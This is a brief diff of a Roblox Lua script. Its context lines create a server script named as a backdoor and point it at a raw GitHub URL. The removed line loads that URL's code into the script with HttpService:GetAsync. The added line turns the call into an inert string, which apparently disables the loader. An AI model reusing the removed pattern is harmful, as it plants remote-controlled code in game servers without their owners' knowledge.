@@ -9,4 +9,4 @@ local scrurl = "https://raw.githubusercontent.com/Oflice/Rc7-Rework/refs/heads/m
 local Script = Instance.new("Script")
 Script.Name = "XX__RC7__XX__SCRIPT_MAIN__BACKDOOR_cx"
 Script.Parent = game:GetService("ServerScriptService")
-Script.Source = HttpService:GetAsync(scrurl)
+Script.Source = [[HttpService:GetAsync(scrurl)]]
